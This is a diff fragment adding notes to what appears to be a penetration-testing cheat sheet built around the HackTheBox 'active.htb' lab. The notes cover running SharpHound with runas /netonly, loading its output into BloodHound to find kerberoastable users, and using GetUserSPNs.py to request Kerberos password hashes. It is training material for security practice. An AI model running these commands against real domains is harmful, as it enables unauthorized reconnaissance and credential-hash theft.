@@ -418,6 +418,19 @@ python GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS
 
 In this case the user `active.htb/SVC_TGS` was obtained from the Groups.xml file.
 
+To run sharphound which collects Active Directory information, we run a command prompt from Windows as the user we have active directory credentials for. Then we launch sharphound
+```
+runas /netonly /user:{{domain eg. active.htb}}\{{user eg. svc_tgs}} cmd
+```
+
+In the new command prompt:
+```
+SharpHound.exe -d {{domain eg active.htb}} --domaincontroller {{ip domain controller}} -c all
+```
+Find sharphound.exe in bloodhound repo / Collectors.
+
+Import the file generated with sharphound to bloodhound to query. There are several pre-loaded queries. For example, it is possible to check if a user is kerberoastable.
+
 If Bloodhound indicates a user is kerberoastable, then run the following to retrieve the kerberos password hash:
 ```
 GetUserSPNs.py  -request -dc-ip {{if of the domain controller}} {{user as which is being run with domain (password needed) e.g. active.htb/svc_tgs}}
